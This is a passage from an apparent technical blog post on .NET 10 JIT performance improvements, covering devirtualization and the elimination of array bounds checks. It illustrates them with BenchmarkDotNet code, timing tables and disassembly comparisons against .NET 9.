BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private ReadOnlyCollection<int> _list = new(Enumerable.Range(1, 1000).ToArray()); [Benchmark] public int SumEnumerable() { int sum = 0; foreach (var item in _list) { sum += item; } return sum; } [Benchmark] public int SumForLoop() { ReadOnlyCollection<int> list = _list; int sum = 0; int count = list.Count; for (int i = 0; i &lt; count; i++) { sum += _list[i]; } return sum; } }</int></int></code></pre><p>When asked &ldquo;which of these will be faster&rdquo;, the obvious answer is &ldquo;<code>SumForLoop</code>&ldquo;. After all, <code>SumEnumerable</code> is going to allocate an enumerator and has to make twice the number of interface calls (<code>MoveNext</code>+<code>Current</code> per iteration vs <code>this[int]</code> per iteration). As it turns out, the obvious answer is also wrong. Here are the timings on my machine for .NET 9:</p><table> <thead> <tr> <th>Method</th> <th>Mean</th> </tr> </thead> <tbody> <tr> <td>SumEnumerable</td> <td>949.5 ns</td> </tr> <tr> <td>SumForLoop</td> <td>1,932.7 ns</td> </tr> </tbody> </table><p>What the what?? If I change the <code>ToArray</code> to instead be <code>ToList</code>, however, the numbers are much more in line with our expectations.</p><table> <thead> <tr> <th>Method</th> <th>Mean</th> </tr> </thead> <tbody> <tr> <td>SumEnumerable</td> <td>1,542.0 ns</td> </tr> <tr> <td>SumForLoop</td> <td>894.1 ns</td> </tr> </tbody> </table><p>So what&rsquo;s going on here? It&rsquo;s super subtle. First, it&rsquo;s necessary to know that <code>ReadOnlyCollection<t></t></code> just wraps an arbitrary <code>IList<t></t></code>, the <code>ReadOnlyCollection<t></t></code>&lsquo;s <code>GetEnumerator()</code> returns <code>_list.GetEnumerator()</code> (I&rsquo;m ignoring for this discussion the special-case where the list is empty), and <code>ReadOnlyCollection<t></t></code>&lsquo;s indexer just indexes into the <code>IList<t></t></code>&lsquo;s indexer. So far presumably this all sounds like what you&rsquo;d expect. But where things gets interesting is around what the JIT is able to devirtualize. In .NET 9, it struggles to devirtualize calls to the interface implementations specifically on <code>T[]</code>, so it won&rsquo;t devirtualize either the <code>_list.GetEnumerator()</code> call nor the <code>_list[index]</code> call. However, the enumerator that&rsquo;s returned is just a normal type that implements <code>IEnumerator<t></t></code>, and the JIT has no problem devirtualizing its <code>MoveNext</code> and <code>Current</code> members. Which means that we&rsquo;re actually paying a lot more going through the indexer, because for <code>N</code> elements, we&rsquo;re having to make <code>N</code> interface calls, whereas with the enumerator, we only need the one with <code>GetEnumerator</code> interface call and then no more after that.</p><p>Thankfully, this is now addressed in .NET 10. <a href="https://github.com/dotnet/runtime/pull/108153">dotnet/runtime#108153</a>, <a href="https://github.com/dotnet/runtime/pull/109209">dotnet/runtime#109209</a>, <a href="https://github.com/dotnet/runtime/pull/109237">dotnet/runtime#109237</a>, and <a href="https://github.com/dotnet/runtime/pull/116771">dotnet/runtime#116771</a> all make it possible for the JIT to devirtualize array&rsquo;s interface method implementations. Now when we run the same benchmark (reverted back to using <code>ToArray</code>), we get results much more in line with our expectations, with both benchmarks improving from .NET 9 to .NET 10, and with <code>SumForLoop</code> on .NET 10 being the fastest.</p><table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>SumEnumerable</td> <td>.NET 9.0</td> <td>968.5 ns</td> <td>1.00</td> </tr> <tr> <td>SumEnumerable</td> <td>.NET 10.0</td> <td>775.5 ns</td> <td>0.80</td> </tr> <tr> <td></td> <td></td> <td></td> <td></td> </tr> <tr> <td>SumForLoop</td> <td>.NET 9.0</td> <td>1,960.5 ns</td> <td>1.00</td> </tr> <tr> <td>SumForLoop</td> <td>.NET 10.0</td> <td>624.6 ns</td> <td>0.32</td> </tr> </tbody> </table><p>One of the really interesting things about this is how many libraries are implemented on the premise that it&rsquo;s faster to use an <code>IList<t></t></code>&lsquo;s indexer for iteration than it is to use its <code>IEnumerable<t></t></code> for iteration, and that includes <code>System.Linq</code>. All these years, where LINQ has had specialized code paths for working with <code>IList<t></t></code> when possible, while in many cases it&rsquo;s been a welcome optimization, in <em>some</em> cases (such as when the concrete type is a <code>ReadOnlyCollection<t></t></code>), it&rsquo;s actually been a deoptimization.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Collections.ObjectModel; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private ReadOnlyCollection<int> _list = new(Enumerable.Range(1, 1000).ToArray()); [Benchmark] public int SkipTakeSum() =&gt; _list.Skip(100).Take(800).Sum(); }</int></code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>SkipTakeSum</td> <td>.NET 9.0</td> <td>3.525 us</td> <td>1.00</td> </tr> <tr> <td>SkipTakeSum</td> <td>.NET 10.0</td> <td>1.773 us</td> <td>0.50</td> </tr> </tbody> </table><p>Fixing devirtualization for array&rsquo;s interface implementation then also has this transitive effect on LINQ.</p><p>Guarded Devirtualization (GDV) is also improved in .NET 10, such as from <a href="https://github.com/dotnet/runtime/pull/116453">dotnet/runtime#116453</a> and <a href="https://github.com/dotnet/runtime/pull/109256">dotnet/runtime#109256</a>. With <a href="https://devblogs.microsoft.com/dotnet/performance-improvements-in-net-8/#tiering-and-dynamic-pgo">dynamic PGO</a>, the JIT is able to instrument a method&rsquo;s compilation and then use the resulting profiling data as part of emitting an optimized version of the method. One of the things it can profile are which types are used in a virtual dispatch. If one type dominates, it can special-case that type in the code gen and emit a customized implementation specific to that type. That then enables devirtualization in that dedicated path, which is &ldquo;guarded&rdquo; by the relevant type check, hence &ldquo;GDV&rdquo;. In some cases, however, such as if a virtual call was being made in a shared generic context, GDV would not kick in. Now it will.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Runtime.CompilerServices; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { [Benchmark] public bool Test() =&gt; GenericEquals("abc", "abc"); [MethodImpl(MethodImplOptions.NoInlining)] private static bool GenericEquals<t>(T a, T b) =&gt; EqualityComparer<t>.Default.Equals(a, b); }</t></t></code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>Test</td> <td>.NET 9.0</td> <td>2.816 ns</td> <td>1.00</td> </tr> <tr> <td>Test</td> <td>.NET 10.0</td> <td>1.511 ns</td> <td>0.54</td> </tr> </tbody> </table><p><a href="https://github.com/dotnet/runtime/pull/110827">dotnet/runtime#110827</a> from <a href="https://github.com/hez2010">@hez2010</a> also helps more methods to be inlined by doing another pass looking for opportunities after later phases of devirtualization. The JIT&rsquo;s optimizations are split up into multiple phases; each phase can make improvements, and those improvements can expose additional opportunities. If those opportunities would only be capitalized on by a phase that already ran, they can be missed. But for phases that are relatively cheap to perform, such as doing a pass looking for additional inlining opportunities, those phases can be repeated once enough other optimization has happened that it&rsquo;s likely productive to do so again.</p><h3>Bounds Checking</h3><p>C# is a memory-safe language, an important aspect of modern programming languages. A key component of this is the inability to walk off the beginning or end of an array, string, or span. The runtime ensures that any such invalid attempt produces an exception, rather than being allowed to perform the invalid memory access. We can see what this looks like with a small benchmark:</p><pre><code>// dotnet run -c Release -f net10.0 --filter "*" using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [DisassemblyDiagnoser] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private int[] _array = new int[3]; [Benchmark] public int Read() =&gt; _array[2]; }</code></pre><p>This is a valid access: the <code>_array</code> contains three elements, and the <code>Read</code> method is reading its last element. However, the JIT can&rsquo;t be 100% certain that this access is in bounds (something could have changed what&rsquo;s in the <code>_array</code> field to be a shorter array), and thus it needs to emit a check to ensure we&rsquo;re not walking off the end of the array. Here&rsquo;s what the generated assembly code for <code>Read</code> looks like:</p><pre><code>; .NET 10 ; Tests.Read() push rax mov rax,[rdi+8] cmp dword ptr [rax+8],2 jbe short M00_L00 mov eax,[rax+18] add rsp,8 ret M00_L00: call CORINFO_HELP_RNGCHKFAIL int 3 ; Total bytes of code 25</code></pre><p>The <code>this</code> reference is passed into the <code>Read</code> instance method in the <code>rdi</code> register, and the <code>_array</code> field is at offset 8, so the <code>mov rax,[rdi+8]</code> instruction is loading the address of the array into the <code>rax</code> register. Then the <code>cmp</code> is loading the value at offset 8 from that address; it so happens that&rsquo;s where the length of the array is stored in the array object. So, this <code>cmp</code> instruction is the bounds check; it&rsquo;s comparing <code>2</code> against that length to ensure it&rsquo;s in bounds. If the array were too short for this access, the next <code>jbe</code> instruction would branch to the <code>M00_L00</code> label, which calls the <code>CORINFO_HELP_RNGCHKFAIL</code> helper function that throws an <code>IndexOutOfRangeException</code>. Any time you see this pair of <code>call CORINFO_HELP_RNGCHKFAIL</code>/<code>int 3</code> at the end of a method, there was at least one bounds check emitted by the JIT in that method.</p><p>Of course, we not only want safety, we also want great performance, and it&rsquo;d be terrible for performance if every single read from an array (or string or span) incurred such an additional check. As such, the JIT strives to avoid emitting these checks when they&rsquo;d be redundant, when it can prove by construction that the accesses are safe. For example, let me tweak my benchmark slightly, moving the array from an instance field into a <code>static readonly</code> field:</p><pre><code>// dotnet run -c Release -f net10.0 --filter "*" using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [DisassemblyDiagnoser] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private static readonly int[] s_array = new int[3]; [Benchmark] public int Read() =&gt; s_array[2]; }</code></pre><p>We now get this assembly:</p><pre><code>; .NET 10 ; Tests.Read() mov rax,705D5419FA20 mov eax,[rax+18] ret ; Total bytes of code 14</code></pre><p>The <code>static readonly</code> field is immutable, arrays can&rsquo;t be resized, and the JIT can guarantee that the field is initialized prior to generating the code for <code>Read</code>. Therefore, when generating the code for <code>Read</code>, it can know with certainty that the array is of length three, and we&rsquo;re accessing the element at index two. Therefore, the specified array index is guaranteed to be within bounds, and there&rsquo;s no need for a bounds check. We simply get two <code>mov</code>s, the first <code>mov</code> to load the address of the array (which, thanks to improvements in previous releases, is allocated on a heap that doesn&rsquo;t need to be compacted such that the array lives at a fixed address), and the second <code>mov</code> to read the <code>int</code> value at the location of index two (these are <code>int</code>s, so index two lives <code>2 * sizeof(int) = 8</code> bytes from the start of the array&rsquo;s data, which itself on 64-bit is offset 16 bytes from the start of the array reference, for a total offset of 24 bytes, or in hex 0x18, hence the <code>rax+18</code> in the disassembly).</p><p>Every release of .NET, more and more opportunities are found and implemented to eschew bounds checks that were previously being generated. .NET 10 continues this trend.</p><p>Our first example comes from <a href="https://github.com/dotnet/runtime/pull/109900">dotnet/runtime#109900</a>, which was inspired by the implementation of <code>BitOperations.Log2</code>. The operation has intrinsic hardware support on many architectures, and generally <code>BitOperations.Log2</code> will use one of the hardware intrinsics available to it for a very efficient implementation (e.g. <code>Lscnt.LeadingZeroCount</code>, <code>ArmBase.LeadingZeroCount</code>, or <code>X86Base.BitScanReverse</code>), however as a fallback implementation it uses a lookup table. The lookup table has 32 elements, and the operation involves computing a <code>uint</code> value and then shifting it down by 27 in order to get the top 5 bits. Any possible result is guaranteed to be a non-negative number less than 32, but indexing into the span with that result still produced a bounds check, and, as this is a critical path, &ldquo;unsafe&rdquo; code (meaning code that eschews the guardrails the runtime supplies by default) was then used to avoid the bounds check.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [DisassemblyDiagnoser] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD", "value")] public partial class Tests { [Benchmark] [Arguments(42)] public int Log2SoftwareFallback2(uint value) { ReadOnlySpan<byte> Log2DeBruijn = [ 00, 09, 01, 10, 13, 21, 02, 29, 11, 14, 16, 18, 22, 25, 03, 30, 08, 12, 20, 28, 15, 17, 24, 07, 19, 27, 23, 06, 26, 05, 04, 31 ]; value |= value &gt;&gt; 01; value |= value &gt;&gt; 02; value |= value &gt;&gt; 04; value |= value &gt;&gt; 08; value |= value &gt;&gt; 16; return Log2DeBruijn[(int)((value * 0x07C4ACDDu) &gt;&gt; 27)]; } }</byte></code></pre><p>Now in .NET 10, the bounds check is gone (note the presence of the <code>call CORINFO_HELP_RNGCHKFAIL</code> in the .NET 9 assembly and the lack of it in the .NET 10 assembly).</p><pre><code>; .NET 9 ; Tests.Log2SoftwareFallback2(UInt32) push rax mov eax,esi shr eax,1 or esi,eax mov eax,esi shr eax,2 or esi,eax mov eax,esi shr eax,4 or esi,eax mov eax,esi shr eax,8 or esi,eax mov eax,esi shr eax,10 or eax,esi imul eax,7C4ACDD shr eax,1B cmp eax,20 jae short M00_L00 mov rcx,7913CA812E10 movzx eax,byte ptr [rax+rcx] add rsp,8 ret M00_L00: call CORINFO_HELP_RNGCHKFAIL int 3 ; Total bytes of code 74 ; .NET 10 ; Tests.Log2SoftwareFallback2(UInt32) mov eax,esi shr eax,1 or esi,eax mov eax,esi shr eax,2 or esi,eax mov eax,esi shr eax,4 or esi,eax mov eax,esi shr eax,8 or esi,eax mov eax,esi shr eax,10 or eax,esi imul eax,7C4ACDD shr eax,1B mov rcx,7CA298325E10 movzx eax,byte ptr [rcx+rax] ret ; Total bytes of code 58</code></pre><p>This improvement then enabled <a href="https://github.com/dotnet/runtime/pull/118560">dotnet/runtime#118560</a> to simplify the code in the real <code>Log2SoftwareFallback</code>, avoiding manual use of unsafe constructs.</p><p><a href="https://github.com/dotnet/runtime/pull/113790">dotnet/runtime#113790</a> implements a similar case, where the result of a mathematical operation is guaranteed to be in bounds. In this case, it&rsquo;s the result of <code>Log2</code>. The change teaches the JIT to understand the maximum possible value that <code>Log2</code> could produce, and if that maximum is in bounds, then any result is guaranteed to be in bounds as well.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [DisassemblyDiagnoser] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD", "value")] public partial class Tests { [Benchmark] [Arguments(12345)] public nint CountDigits(ulong value) { ReadOnlySpan<byte> log2ToPow10 = [ 1, 1, 1, 2, 2, 2, 3, 3, 3, 4, 4, 4, 4, 5, 5, 5, 6, 6, 6, 7, 7, 7, 7, 8, 8, 8, 9, 9, 9, 10, 10, 10, 10, 11, 11, 11, 12, 12, 12, 13, 13, 13, 13, 14, 14, 14, 15, 15, 15, 16, 16, 16, 16, 17, 17, 17, 18, 18, 18, 19, 19, 19, 19, 20 ]; return log2ToPow10[(int)ulong.Log2(value)]; } }</byte></code></pre><p>We can see the bounds check present in the .NET 9 output and absent in the .NET 10 output:</p><pre><code>; .NET 9 ; Tests.CountDigits(UInt64) push rax or rsi,1 xor eax,eax lzcnt rax,rsi xor eax,3F cmp eax,40 jae short M00_L00 mov rcx,7C2D0A213DF8 movzx eax,byte ptr [rax+rcx] add rsp,8 ret M00_L00: call CORINFO_HELP_RNGCHKFAIL int 3 ; Total bytes of code 45 ; .NET 10 ; Tests.CountDigits(UInt64) or rsi,1 xor eax,eax lzcnt rax,rsi xor eax,3F mov rcx,71EFA9400DF8 movzx eax,byte ptr [rcx+rax] ret ; Total bytes of code 29</code></pre><p>My choice of benchmark in this case was not coincidental. This pattern shows up in the <code>FormattingHelpers.CountDigits</code> internal method that&rsquo;s used by the core primitive types in their <code>ToString</code> and <code>TryFormat</code> implementations, in order to determine how much space will be needed to store rendered digits for a number. As with the previous example, this routine is considered core enough that it was using unsafe code to avoid the bounds check. With this fix, the code was able to be changed back to using a simple span access, and even with the simpler code, it&rsquo;s now also faster.</p><p>Now, consider this code:</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [DisassemblyDiagnoser] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD", "ids")] public partial class Tests { public IEnumerable<int> Ids { get; } = [[1, 2, 3, 4, 5, 1]]; [Benchmark] [ArgumentsSource(nameof(Ids))] public bool StartAndEndAreSame(int[] ids) =&gt; ids[0] == ids[^1]; }</int></code></pre><p>I have a method that&rsquo;s accepting an <code>int[]</code> and checking to see whether it starts and ends with the same value. The JIT has no way of knowing whether the <code>int[]</code> is empty or not, so it <em>does</em> need a bounds check; otherwise, accessing <code>ids[0]</code> could walk off the end of the array. However, this is what we see on .NET 9:</p><pre><code>; .NET 9 ; Tests.StartAndEndAreSame(Int32[]) push rax mov eax,[rsi+8] test eax,eax je short M00_L00 mov ecx,[rsi+10] lea edx,[rax-1] cmp edx,eax jae short M00_L00 mov eax,edx cmp ecx,[rsi+rax*4+10] sete al movzx eax,al add rsp,8 ret M00_L00: call CORINFO_HELP_RNGCHKFAIL int 3 ; Total bytes of code 41</code></pre><p>Note there are two jumps to the <code>M00_L00</code> label that handles failed bounds checks&hellip; that&rsquo;s because there are two bounds checks here, one for the start access and one for the end access. But that shouldn&rsquo;t be necessary. <code>ids[^1]</code> is the same as <code>ids[ids.Length - 1]</code>. If the code has successfully accessed <code>ids[0]</code>, that means the array is at least one element in length, and if it&rsquo;s at least one element in length, <code>ids[ids.Length - 1]</code> will always be in bounds. Thus, the second bounds check shouldn&rsquo;t be needed. Indeed, thanks to <a href="https://github.com/dotnet/runtime/pull/116105">dotnet/runtime#116105</a>, this is what we now get on .NET 10 (one branch to <code>M00_L00</code> instead of two):</p><pre><code>; .NET 10 ; Tests.StartAndEndAreSame(Int32[]) push rax mov eax,[rsi+8] test eax,eax je short M00_L00 mov ecx,[rsi+10] dec eax cmp ecx,[rsi+rax*4+10] sete al movzx eax,al add rsp,8 ret M00_L00: call CORINFO_HELP_RNGCHKFAIL int 3 ; Total bytes of code 34</code></pre><p>What&rsquo;s really interesting to me here is the knock-on effect of having removed the bounds check. It didn&rsquo;t just eliminate the <code>cmp/jae</code> pair of instructions that&rsquo;s typical of a bounds check. The .NET 9 version of the code had this:</p><pre><code>lea edx,[rax-1] cmp edx,eax jae short M00_L00 mov eax,edx</code></pre><p>At this point in the assembly, the <code>rax</code> register is storing the length of the array. It&rsquo;s calculating <code>ids.Length - 1</code> and storing the result into <code>edx</code>, and then checking to see whether <code>ids.Length-1</code> is in bounds of <code>ids.Length</code> (the only way it wouldn&rsquo;t be is if the array were empty such that <code>ids.Length-1</code> wrapped around to <code>uint.MaxValue</code>); if it&rsquo;s not, it jumps to the fail handler, and if it is, it stores the already computed <code>ids.Length - 1</code> into <code>eax</code>. By removing the bounds check, we get rid of those two intervening instructions, leaving these:</p><pre><code>lea edx,[rax-1] mov eax,edx</code></pre><p>which is a little silly, as this sequence is just computing a decrement, and as long as it&rsquo;s ok that flags get modified, it could instead just be:</p><pre><code>dec eax</code></pre><p>which, as you can see in the .NET 10 output, is exactly what .NET 10 now does.</p><p><a href="https://github.com/dotnet/runtime/pull/115980">dotnet/runtime#115980</a> addresses another case. Let&rsquo;s say I have this method:</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [DisassemblyDiagnoser] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD", "start", "text")] public partial class Tests { [Benchmark] [Arguments("abc", "abc.")] public bool IsFollowedByPeriod(string start, string text) =&gt; start.Length &lt; text.Length &amp;&amp; text[start.Length] == '.'; }</code></pre><p>We&rsquo;re validating that one input&rsquo;s length is less than the other, and then checking to see what comes immediately after it in the other. We know that <code>string.Length</code> is immutable, so a bounds check here is redundant, but until .NET 10, the JIT couldn&rsquo;t see that.</p><pre><code>; .NET 9 ; Tests.IsFollowedByPeriod(System.String, System.String) push rbp mov rbp,rsp mov eax,[rsi+8] mov ecx,[rdx+8] cmp eax,ecx jge short M00_L00 cmp eax,ecx jae short M00_L01 cmp word ptr [rdx+rax*2+0C],2E sete al movzx eax,al pop rbp ret M00_L00: xor eax,eax pop rbp ret M00_L01: call CORINFO_HELP_RNGCHKFAIL int 3 ; Total bytes of code 42 ; .NET 10 ; Tests.IsFollowedByPeriod(System.String, System.String) mov eax,[rsi+8] mov ecx,[rdx+8] cmp eax,ecx jge short M00_L00 cmp word ptr [rdx+rax*2+0C],2E sete al movzx eax,al ret M00_L00: xor eax,eax ret ; Total bytes of code 26</code></pre><p>The removal of the bounds check almost halves the size of the function. If we don&rsquo;t need to do a bounds check, we get to elide the <code>cmp/jae</code>. Without that branch, nothing is targeting <code>M00_L01</code>, and we can remove the <code>call/int</code> pair that were only necessary to support a bounds check. Then without the <code>call</code> in <code>M00_L01</code>, which was the only <code>call</code> in the whole method, the prologue and epilogue can be elided, meaning we also don&rsquo;t need the opening and closing <code>push</code> and <code>pop</code> instructions.</p><p><a href="https://github.com/dotnet/runtime/pull/113233">dotnet/runtime#113233</a> improved handling &ldquo;assertions&rdquo; (facts the JIT claims and based on which the JIT makes optimizations) to be less order dependent. In .NET 9, this code:</p><pre><code>static bool Test(ReadOnlySpan<char> span, int pos) =&gt; pos &gt; 0 &amp;&amp; pos &lt;= span.Length - 42 &amp;&amp; span[pos - 1] != '\n';</char></code></pre><p>was successfully removing the bounds check on the span access, but the following variant, which just switches the order of the first two conditions, was still incurring the bounds check.</p><pre><code>static bool Test(ReadOnlySpan<char> span, int pos) =&gt; pos &lt;= span.Length - 42 &amp;&amp; pos &gt; 0 &amp;&amp; span[pos - 1] != '\n';</char></code></pre><p>Note that both conditions contribute an assertion (fact) that need to be merged in order to know the bounds check can be avoided. Now in .NET 10, the bounds check is elided, regardless of the order.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [DisassemblyDiagnoser] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private string _s = new string('s', 100); private int _pos = 10; [Benchmark] public bool Test() { string s = _s; int pos = _pos; return pos &lt;= s.Length - 42 &amp;&amp; pos &gt; 0 &amp;&amp; s[pos - 1] != '\n'; } }</code></pre><pre><code>; .NET 9 ; Tests.Test() push rbp mov rbp,rsp mov rax,[rdi+8] mov ecx,[rdi+10] mov edx,[rax+8] lea edi,[rdx-2A] cmp edi,ecx jl short M00_L00 test ecx,ecx jle short M00_L00 dec ecx cmp ecx,edx jae short M00_L01 cmp word ptr [rax+rcx*2+0C],0A setne al movzx eax,al pop rbp ret M00_L00: xor eax,eax pop rbp ret M00_L01: call CORINFO_HELP_RNGCHKFAIL int 3 ; Total bytes of code 55 ; .NET 10 ; Tests.Test() push rbp mov rbp,rsp mov rax,[rdi+8] mov ecx,[rdi+10] mov edx,[rax+8] add edx,0FFFFFFD6 cmp edx,ecx jl short M00_L00 test ecx,ecx jle short M00_L00 dec ecx cmp word ptr [rax+rcx*2+0C],0A setne al movzx eax,al pop rbp ret M00_L00: xor eax,eax pop rbp ret ; Total bytes of code 45</code></pre><p><a href="https://github.com/dotnet/runtime/pull/113862">dotnet/runtime#113862</a> addresses a similar case where assertions weren&rsquo;t being handled as precisely as they could have been. Consider this code:</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [DisassemblyDiagnoser] [MemoryDiagnoser(displayGenColumns: false)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private int[] _arr = Enumerable.Range(0, 10).ToArray(); [Benchmark] public int Sum() { int[] arr = _arr; int sum = 0; int i; for (i = 0; i &lt; arr.Length - 3; i += 4) { sum += arr[i + 0]; sum += arr[i + 1]; sum += arr[i + 2]; sum += arr[i + 3]; } for (; i &lt; arr.Length; i++) { sum += arr[i]; } return sum; } }</code></pre><p>The <code>Sum</code> method is trying to do manual loop unrolling. Rather than incurring a branch on each element, it&rsquo;s handling four elements per iteration. Then, for the case where the length of the input isn&rsquo;t evenly divisible by four, it&rsquo;s handling the remaining elements in a separate loop. In .NET 9, the JIT successfully elides the bounds checks in the main unrolled loop:</p><pre><code>; .NET 9 ; Tests.Sum() push rbp mov rbp,rsp mov rax,[rdi+8] xor ecx,ecx xor edx,edx mov edi,[rax+8] lea esi,[rdi-3] test esi,esi jle short M00_L02 M00_L00: mov r8d,edx add ecx,[rax+r8*4+10] lea r8d,[rdx+1] add ecx,[rax+r8*4+10] lea r8d,[rdx+2] add ecx,[rax+r8*4+10] lea r8d,[rdx+3] add ecx,[rax+r8*4+10] add edx,4 cmp esi,edx jg short M00_L00 jmp short M00_L02 M00_L01: cmp edx,edi jae short M00_L03 mov esi,edx add ecx,[rax+rsi*4+10] inc edx M00_L02: cmp edi,edx jg short M00_L01 mov eax,ecx pop rbp ret M00_L03: call CORINFO_HELP_RNGCHKFAIL int 3 ; Total bytes of code 92</code></pre><p>You can see this in the <code>M00_L00</code> section, which has the five <code>add</code> instructions (four for the summed elements, and one for the index). However, we still see the <code>CORINFO_HELP_RNGCHKFAIL</code> at the end, indicating this method has a bounds check. That&rsquo;s coming from the final loop, due to the JIT losing track of the fact that <code>i</code> is guaranteed to be non-negative. Now in .NET 10, that bounds check is removed as well (again, just look for the lack of the <code>CORINFO_HELP_RNGCHKFAIL</code> call).</p><pre><code>; .NET 10 ; Tests.Sum() push rbp mov rbp,rsp mov rax,[rdi+8] xor ecx,ecx xor edx,edx mov edi,[rax+8] lea esi,[rdi-3] test esi,esi jle short M00_L01 M00_L00: mov r8d,edx add ecx,[rax+r8*4+10] lea r8d,[rdx+1] add ecx,[rax+r8*4+10] lea r8d,[rdx+2] add ecx,[rax+r8*4+10] lea r8d,[rdx+3] add ecx,[rax+r8*4+10] add edx,4 cmp esi,edx jg short M00_L00 M00_L01: cmp edi,edx jle short M00_L03 test edx,edx jl short M00_L04 M00_L02: mov esi,edx add ecx,[rax+rsi*4+10] inc edx cmp edi,edx jg short M00_L02 M00_L03: mov eax,ecx pop rbp ret M00_L04: mov esi,edx add ecx,[rax+rsi*4+10] inc edx cmp edi,edx jg short M00_L04 jmp short M00_L03 ; Total bytes of code 102</code></pre><p>Another nice improvement comes from <a href="https://github.com/dotnet/runtime/pull/112824">dotnet/runtime#112824</a>, which teaches the JIT to turn facts it already learned from earlier checks into concrete numeric ranges, and then use those ranges to fold away later relational tests and bounds checks. Consider this example:</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Runtime.CompilerServices; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [DisassemblyDiagnoser] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private int[] _array = new int[10]; [Benchmark] public void Test() =&gt; SetAndSlice(_array); [MethodImpl(MethodImplOptions.NoInlining)] private static Span<int> SetAndSlice(Span<int> src) { src[5] = 42; return src.Slice(4); } }</int></int></code></pre><p>We have to incur a bounds check for the <code>src[5]</code>, as the JIT has no evidence that <code>src</code> is at least six elements long. However, by the time we get to the <code>Slice</code> call, we know the span has a length of at least six, or else writing into <code>src[5]</code> would have failed. We can use that knowledge to remove the length check from within the <code>Slice</code> call (note the removal of the <code>call qword ptr [7F8DDB3A7810]</code>/<code>int 3</code> sequence, which is the manual length check and call to a throw helper method in <code>Slice</code>).</p><pre><code>; .NET 9 ; Tests.SetAndSlice(System.Span`1<int32>) push rbp mov rbp,rsp cmp esi,5 jbe short M01_L01 mov dword ptr [rdi+14],2A cmp esi,4 jb short M01_L00 add rdi,10 mov rax,rdi add esi,0FFFFFFFC mov edx,esi pop rbp ret M01_L00: call qword ptr [7F8DDB3A7810] int 3 M01_L01: call CORINFO_HELP_RNGCHKFAIL int 3 ; Total bytes of code 48 ; .NET 10 ; Tests.SetAndSlice(System.Span`1<int32>) push rax cmp esi,5 jbe short M01_L00 mov dword ptr [rdi+14],2A lea rax,[rdi+10] lea edx,[rsi-4] add rsp,8 ret M01_L00: call CORINFO_HELP_RNGCHKFAIL int 3 ; Total bytes of code 31</int32></int32></code></pre><p>Let&rsquo;s look at one more, which has a very nice impact on bounds checking, even though technically the optimization is broader than just that. <a href="https://github.com/dotnet/runtime/pull/113998">dotnet/runtime#113998</a> creates assertions from <code>switch</code> targets. This means that the body of a <code>switch</code> case statement inherits facts about what was switched over based on what the <code>case</code> was, e.g. in a <code>case 3</code> for <code>switch (x)</code>, the body of that case will now &ldquo;know&rdquo; that <code>x</code> is three. This is great for very popular patterns with arrays, strings, and spans, where developers switch over the length and then index into available indices in the appropriate branches. Consider this:</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Runtime.CompilerServices; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); 